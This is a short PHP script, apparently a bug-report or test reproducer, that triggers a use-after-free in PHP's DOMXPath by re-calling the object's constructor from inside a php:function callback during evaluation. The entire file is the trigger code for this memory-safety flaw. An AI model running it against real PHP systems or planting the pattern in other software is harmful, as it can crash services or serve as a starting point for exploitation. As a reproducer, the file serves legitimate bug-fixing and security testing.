<?php
// DOMXPath php:function callback calls $xpath->__construct($otherDoc) on the SAME
// object mid-evaluation. dom_xpath_construct xmlXPathFreeContext(oldctx) frees the
// context that xmlXPathEvalExpression (xpath.c:329) is actively using -> UAF.
$doc = new DOMDocument();
$doc->loadXML('<root><a>1</a><b>2</b><c>3</c></root>');
$xpath = new DOMXPath($doc);
$xpath->registerNamespace('php', 'http://php.net/xpath');
$xpath->registerPhpFunctions();
$GLOBALS['xpath'] = $xpath;
$d2 = new DOMDocument();
$d2->loadXML('<other/>');
$GLOBALS['d2'] = $d2;

function evil($v = null) {
    // reentrant teardown of the running xpath context
    $GLOBALS['xpath']->__construct($GLOBALS['d2']);
    return 'z';
}

$res = $xpath->evaluate('string(php:function("evil"))');
var_dump($res);
echo "done\n";
